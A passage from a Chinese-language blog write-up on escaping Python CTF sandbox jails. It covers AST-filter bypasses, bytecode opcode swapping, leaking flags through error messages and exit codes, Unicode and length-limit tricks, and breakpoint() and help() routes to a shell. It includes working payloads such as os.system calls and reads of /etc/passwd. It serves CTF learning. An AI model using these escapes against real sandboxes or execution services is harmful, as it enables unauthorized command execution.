                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]</code></pre>

<p>fitler 中使用 match&#x2F;case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用<code> iter</code> 和 <code>next</code> 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<h4 id="绕过ast-GeneratorExp获取生成器栈帧"><a href="#绕过ast-GeneratorExp获取生成器栈帧" class="headerlink" title="绕过ast.GeneratorExp获取生成器栈帧"></a>绕过<code>ast.GeneratorExp</code>获取生成器栈帧</h4><p>思路来自于 [<a target="_blank" rel="noopener" href="https://maplebacon.org/2024/02/dicectf2024-irs/">DiceCTF 2024] IRS</a></p>
<p>payload 如下，且 AST 中不会出现 <code>ast.GeneratorExp</code>。</p>
<pre><code class="highlight plaintext">def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)</code></pre>

<p>如何理解这段代码：</p>
<ol>
<li>首先声明了一个生成器 f，<ol>
<li>f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。</li>
</ol>
</li>
<li>x &#x3D; f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。</li>
<li>x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">import ast

flag = &quot;flag&#123;12345&#125;&quot;
code = &#x27;&#x27;&#x27;
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
&#x27;&#x27;&#x27;

print(ast.dump(ast.parse(code, mode=&#x27;exec&#x27;), indent=4))
root = ast.parse(code)
compiled_code = compile(code,&quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)</code></pre>

<h3 id="OPcode"><a href="#OPcode" class="headerlink" title="OPcode"></a><code>OPcode</code></h3><p>见过pickle的大概都知道OPcode是个什么东西</p>
<blockquote>
<p>opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
</blockquote>
<p>那么如何查看一个函数的opcode呢，写个例子看看先</p>
<pre><code class="highlight plaintext">import dis

code_str = &#x27;print(&quot;a&quot;)&#x27;
code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png" alt="image-20250704170021243"></p>
<h4 id="IMPORT-FROM、LOAD-ATTR-相互替换"><a href="#IMPORT-FROM、LOAD-ATTR-相互替换" class="headerlink" title="IMPORT_FROM、LOAD_ATTR 相互替换"></a>IMPORT_FROM、LOAD_ATTR 相互替换</h4><p>思路来自于:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://sekai.team/blog/lactf-2023/pycjail">LA CTF 2023 – Pycjail  Project SEKAI</a></li>
<li><a target="_blank" rel="noopener" href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">TI-1337 Plus CE: Abusing CPython internals  kmh’s blog</a></li>
</ul>
<p>LOAD_ATTR 可以和 IMPORT_FROM 直接替换。</p>
<h4 id="LOAD-NAME-LOAD-ATTR"><a href="#LOAD-NAME-LOAD-ATTR" class="headerlink" title="LOAD_NAME &amp; LOAD_ATTR"></a>LOAD_NAME &amp; LOAD_ATTR</h4><p>LOAD_ATTR 是用来从对象中获取属性的字节码指令。它通常用于从一个已经加载到栈上的对象（如模块或类实例）中获取某个属性。</p>
<p>例如导入 os.system 函数</p>
<pre><code class="highlight plaintext">import os
os.system</code></pre>

<p>对应的字节码如下，其中最为关键的就是 LOAD_NAME 和 LOAD_ATTR。</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c005a0065006a01010064015300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
5a00 -&gt; STORE_NAME, names[0] -&gt; os
6500 -&gt; LOAD_NAME, names[0] -&gt; os
6a01 -&gt; LOAD_ATTR, names[1] -&gt; system
0100 -&gt; POP_TOP
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="IMPORT-NAME-IMPORT-FROM"><a href="#IMPORT-NAME-IMPORT-FROM" class="headerlink" title="IMPORT_NAME &amp; IMPORT_FROM"></a>IMPORT_NAME &amp; IMPORT_FROM</h4><p>如果使用 from 来进行函数导入:</p>
<pre><code class="highlight plaintext">from os import sys</code></pre>

<p>得到的字节码信息如下，可以看到使用的是 IMPORT_NAME 和 IMPORT_FROM 组合</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 ((&#x27;system&#x27;,))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, (&#x27;system&#x27;,), None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c006d015a01010064025300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; (&#x27;system&#x27;,)
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
6d01 -&gt; IMPORT_FROM, names[1] -&gt; system
5a01 -&gt; STORE_NAME, arg -&gt; 1
0100 -&gt; POP_TOP
6402 -&gt; LOAD_CONST, consts[2] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="替换字节码"><a href="#替换字节码" class="headerlink" title="替换字节码"></a>替换字节码</h4><p>在 LACTF 2023 Pycjail 这道题的场景中，用户输入的 const、names、code 最终会替换到题目中的一个空函数中并执行。排除掉题目其他的过滤，大致的逻辑如下：</p>
<ol>
<li>填充 f 函数 co_consts、co_names、co_code</li>
<li>然后执行函数。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=(&quot;a&quot;, 139, &quot;system&quot;, &quot;dir&quot;),
    co_names=tuple(&quot;__class__,__base__,__subclasses__,__init__,__globals__&quot;.split(&quot;,&quot;)),
    co_code=bytes.fromhex(trans_bytes(&quot;64006a006a01a002a100640119006a036a046402190064038301010064045300&quot;)),
)


print(&quot;here goes!&quot;)
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in (&quot;p&quot;, &quot;r&quot;, &quot;f&quot;):
        del frame.f_globals[k]

p(r(f()))</code></pre>

<p>我们可以使用下面的脚本来生成 payload，我本地的 <code>_wrap_close</code> 的索引为 139.</p>
<pre><code class="highlight plaintext">import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = &#x27;&#x27;&#x27;
&#x27;a&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;dir&#x27;)
&#x27;&#x27;&#x27;

code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>

<p>LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！</p>
<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>
<p>以<code> AmateursCTF</code> 2023 的一道题目为例，题目的源码如下：</p>
<pre><code class="highlight plaintext">#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input(&quot;Give code: &quot;))
            if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\&quot; in code:
                raise ValueError(&quot;invalid input&quot;)
            exec(eval(code))
        except Exception as err:
            print(err)</code></pre>

<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>
<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>
<h4 id="利用异常处理"><a href="#利用异常处理" class="headerlink" title="利用异常处理"></a>利用异常处理</h4><p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
<li><code>KeyError</code>（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
<li><code>FileNotFoundError</code>（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
<li><code>ValueError</code>（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>
<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>
<h5 id="KeyError"><a href="#KeyError" class="headerlink" title="KeyError"></a><code>KeyError</code></h5><p><code>KeyError</code> 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<pre><code class="highlight plaintext">Give code: &#123;&quot;1&quot;:&quot;2&quot;&#125;[_]
&#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="FileNotFoundError"><a href="#FileNotFoundError" class="headerlink" title="FileNotFoundError"></a>FileNotFoundError</h5><p><code>FileNotFoundError </code>出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>
<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<pre><code class="highlight plaintext">Give code: open(_)
[Errno 2] No such file or directory: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="ValueError"><a href="#ValueError" class="headerlink" title="ValueError"></a>ValueError</h5><p><code>ValueError </code>比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>
<pre><code class="highlight plaintext">Give code: int(_)
ValueError: invalid literal for int() with base 10: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>
<h5 id="Popen-returncode"><a href="#Popen-returncode" class="headerlink" title="Popen.returncode"></a>Popen.returncode</h5><p>在 aliyunCTF 2025 ezoj 这道题中，给出了一个使用 subprocess.Popen 执行 python 脚本，但无回显的情况，</p>
<pre><code class="highlight plaintext">process = subprocess.Popen(
    [&quot;python3&quot;, code_filename],
    stdin=infile,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

try:
    stdout, stderr = process.communicate(timeout=5)
except subprocess.TimeoutExpired:
    process.kill()
    raise OJTimeLimitExceed

if process.returncode != 0:
    raise OJRuntimeError(process.returncode)</code></pre>

<p>但是题目给了一个 OJRuntimeError，并且传入了 returncode 属性。returncode 属性用于保存子进程退出时返回的退出码，反映了子进程是在正常结束还是在运行过程中出现异常。</p>
<p>这道题会将错误码发送给客户端：</p>
<pre><code class="highlight plaintext">except OJRuntimeError as e:
    return &#123;&quot;status&quot;: &quot;RE&quot;, &quot;message&quot;: f&quot;Runtime Error: ret=&#123;e.args[0]&#125;&quot;&#125;</code></pre>

<p><code>returncode</code> 的可能取值有以下几种</p>
<ul>
<li>None：表示子进程尚未终止，此时 returncode 还没有被赋值。</li>
<li>0：表示子进程成功结束，没有发生错误。</li>
<li>正整数：表示子进程执行时出现了错误，返回码通常会反映错误类型或状态码。</li>
<li>负整数：（仅在 POSIX 系统中）表示子进程被某个信号强制终止，其数值通常为 -N，其中 N 是引起终止的信号编号。</li>
</ul>
<p>由于 ascii 也是 0-255，借助这个 returncode 就可以实现回显，但 returncode 仅有一位，所以需要逐位回显。</p>
<pre><code class="highlight plaintext">import sys
...

content_len = len(content)
if &#123;loc&#125; &lt; content_len:
    sys.exit(content[&#123;loc&#125;])
else:
    sys.exit(255)</code></pre>

<h3 id="钩子爹来咯"><a href="#钩子爹来咯" class="headerlink" title="钩子爹来咯!"></a>钩子爹来咯!</h3><p>钩子是什么?<del>钩子就是钩子啊</del></p>
<blockquote>
<p> <strong>Audit Hook</strong>审计钩子是Python3.8开始引入的一项安全功能旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。</p>
<p>审计钩子通过 <code>sys.addaudithook()</code> 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。</p>
</blockquote>
<p>而发生审计事件时，Python就会调用这些钩子</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时</li>
</ul>
<p>所有的事件列表可见：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/audit_events.html">Audit events table — Python 3.13.0 documentation</a></li>
<li><a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">PEP 578 – Python Runtime Audit Hooks</a></li>
</ul>
<h4 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h4><h3 id="乱七八糟的WAF"><a href="#乱七八糟的WAF" class="headerlink" title="乱七八糟的WAF"></a>乱七八糟的WAF</h3><h4 id="过滤import"><a href="#过滤import" class="headerlink" title="过滤import"></a>过滤import</h4><p><strong><code>__import__</code></strong></p>
<p>除了可以使用 import，还可以使用 <code>__import__</code>和 <code>importlib.import_module</code>来导入模块<br><code>importlib </code>需要进行导入后才能够使用</p>
<p>还可以使用<code>execfile</code></p>
<pre><code class="highlight python"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)
importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)

<span class="comment">#py2</span>
execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)

<span class="comment">#py3</span>
<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
    <span class="built_in">exec</span>(f.read())
    <span class="comment">#这个是需要事先知道路径的，要用sys.path(if)去事先试探一下</span></code></pre>

<p><strong><code>__loader__</code></strong></p>
<p><code>__loader__.load_module</code>底层实现与 import 不同, 可以绕过audithook</p>
<pre><code class="highlight plaintext">__loader__.load_module(&#x27;os&#x27;)</code></pre>

<h4 id="过滤字母"><a href="#过滤字母" class="headerlink" title="过滤字母"></a>过滤字母</h4><p>可以用全角字符绕过半角字符</p>
<pre><code class="highlight plaintext">def halfwidth_to_fullwidth(text):
    &quot;&quot;&quot;将半角字符转换为全角字符&quot;&quot;&quot;
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:  # 半角空格 → 全角空格
            result.append(&#x27;\u3000&#x27;)
        elif 0x21 &lt;= code &lt;= 0x7E:  # 可打印ASCII字符 → 全角字符
            result.append(chr(code + 0xFEE0))
        else:  # 其他字符保持不变
            result.append(char)
    return &#x27;&#x27;.join(result)

# 目标字符串
target_string = &quot;eval&quot;

# 转换并直接打印结果
print(halfwidth_to_fullwidth(target_string))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png" alt="image-20250703093113593"></p>
<p>可以看到绕过成功</p>
<p>还有一种方法也可以绕过，利用特殊的Unicode字符</p>
<pre><code class="highlight plaintext">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code></pre>

<pre><code class="highlight plaintext">#coding=utf-8
def convert_to_math_sans_italic(text):
    result = []
    for char in text:
        code = ord(char)
        if 0x30 &lt;= code &lt;= 0x39:
            result.append(chr(code - 0x30 + 0x1D7EC))
        elif 0x61 &lt;= code &lt;= 0x7A:
            result.append(chr(code - 0x61 + 0x1D622))
        elif 0x41 &lt;= code &lt;= 0x5A:
            result.append(chr(code - 0x41 + 0x1D608))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

if __name__ == &quot;__main__&quot;:
    original = &quot;eval&quot;
    converted = convert_to_math_sans_italic(original)
    print(&quot;原始字符串:&quot;, original)
    print(&quot;转换结果: &quot;, converted)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png" alt="image-20250703094342023"></p>
<p>可以看到也绕过成功了</p>
<p>但是要注意的是放在语句中时绝对不能用全角字符作开头，会褒姒</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png" alt="image-20250703094649462"></p>
<h4 id="过滤属性"><a href="#过滤属性" class="headerlink" title="过滤属性"></a>过滤属性</h4><p>利用一下<code>getattr</code>这个函数</p>
<p>功能其实就是获取类的某个属性值</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)
root:x:0:0:root:/root:/usr/bin/zsh</code></pre>

<p>也可以用<code>__getattribute__</code>方法替换</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)
&lt;built-in function system&gt;</code></pre>

<p>还可以用<code>__getattr</code>__</p>
<pre><code class="highlight plaintext">这是一个魔术方法</code></pre>

<h4 id="行数限制"><a href="#行数限制" class="headerlink" title="行数限制"></a>行数限制</h4><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;);print(1)&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;&lt;string&gt;&quot;, line 1
    __import__(&#x27;os&#x27;);print(1)</code></pre>

<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec 可以支持换行符与<code>;</code></p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)
1</code></pre>

<h5 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h5><p>compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码.</p>
<pre><code class="highlight plaintext">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</code></pre>

<h5 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h5><p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<pre><code class="highlight plaintext">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</code></pre>

<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[&lt;module &#x27;os&#x27; (frozen)&gt;, 0]</code></pre>

<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
<pre><code class="highlight plaintext">print(open(bytes([102,108,97,103,46,116,120,116])).read())</code></pre>

<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
<pre><code class="highlight plaintext"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)
# a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)
# l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)
# g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)
# . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)
# t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)
# x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)

print(open(bytes([ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)])).read())</code></pre>

<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 <code>a(&#39;ō&#39;)</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
<pre><code class="highlight plaintext">exec(&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;)</code></pre>

<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<h5 id="打开-input-输入"><a href="#打开-input-输入" class="headerlink" title="打开 input 输入"></a>打开 input 输入</h5><p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<pre><code class="highlight plaintext">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())</code></pre>

<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<pre><code class="highlight plaintext">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些打开输入流的方式:</p>
<ul>
<li><strong>sys.stdin.read()</strong></li>
</ul>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.read())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)
kali
0
&gt;&gt;&gt;</code></pre>

<ul>
<li><strong>sys.stdin.readline()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readline())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<ul>
<li><strong>sys.stdin.readlines()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>在 python2 中，在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
<h5 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h5><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt</code></pre>

<h5 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h5><p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
<pre><code class="highlight plaintext">𝘩𝘦𝘭𝘱()</code></pre>

<p>然后输入 os,此时会进入 os 的帮助文档。</p>
<pre><code class="highlight plaintext">help&gt; os</code></pre>

<p>然后在输入 <code>!sh</code> 就可以拿到 &#x2F;bin&#x2F;sh, 输入 <code>!bash</code> 则可以拿到 &#x2F;bin&#x2F;bash</p>
<pre><code class="highlight plaintext">help&gt; os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$</code></pre>



<h2 id="vm2逃逸"><a href="#vm2逃逸" class="headerlink" title="vm2逃逸"></a>vm2逃逸</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">-Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up 